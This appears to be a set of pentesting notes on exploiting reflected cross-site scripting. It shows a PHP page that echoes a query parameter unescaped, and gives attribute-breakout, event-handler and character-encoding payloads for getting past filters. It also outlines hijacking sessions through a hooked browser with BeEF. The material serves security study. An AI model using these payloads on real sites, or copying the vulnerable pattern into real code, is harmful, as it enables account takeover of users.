# Manual techniques and best practices for exploiting XSS

* This piece of vulnerable code:

  ```php
  <html>
    <head><title>Exploiting XSS</title></head>
    <body>
      <img src="logo.png" alt="<?= $_GET['name'] ?>">
    </body>
  </html>
  ```

  Could be exploited sending an HTTP request with this payload:

  ```url
  http://example.tbl/index.php?name=<script>alert('XSS')</script>
  ```

  The previous JavaScript code will not be executed due to the fact that it's being inserted in the `alt` parameter of the `IMG` tag. We have to escape out of the `alt` tag by using `">`:

  ```url
  http://example.tbl/index.php?name="><script>alert('XSS')</script>
  ```

  Unfortunately, this will break the HTML tag structure and show extra suspicious characters in the web site appearance (i.e. `">` corresponding to the closing of the legitimate alt tag).
* To avoid the presence of suspicious characters in the visible part of the web page, we can use the following payload:

  ```html
  "><body onload="alert('XSS')
  ```

  Note that we are leaving the double quote open because the remaining characters `">` will take care of closing our tag.
* Browsers are the software that interprets the HTML code received by web servers, so there are payloads that may work with Firefox and may not work with Chrome and vice versa.
* Browsers like Firefox and Chrome have an integrated XSS filter for reflected XSS.

## Improving a payload

* The DOM events are often used in XSS exploitation because they allow us to avoid using suspicious characters like `<` and `>`:

  ```html
  " onload="javascript:alert('XSS')
  ```

  This means we don't event need to use any HTML tag's (e.g. `<script>` or `<body>`), therefore, we are able to bypass basic input validations checks.
* Also, we can avoid using single quotes with the help of the JavaScript function `String.fromCharCode`:

  ```html
  " onload="alert(String.fromCharCode(88,83,83))
  ```

### Bypassing the `HttpOnly` flag to steal a session

* An alternative to stealing protected cookies that make use of the `HttpOnly` flag is to use the victim browser as a proxy. Basically, what we can do here is exploit the XSS flaw and then use the victim browser to perform requests as the victim user to the web application.
  * We can do this simply by using [Tunneling Proxy][1] in BeEF. This feature allows you to tunnel requests through the hooked browser.
* Another old technique is called `Cross-Site Tracking (XST)`.

[1]: https://github.com/beefproject/beef/wiki/Tunneling
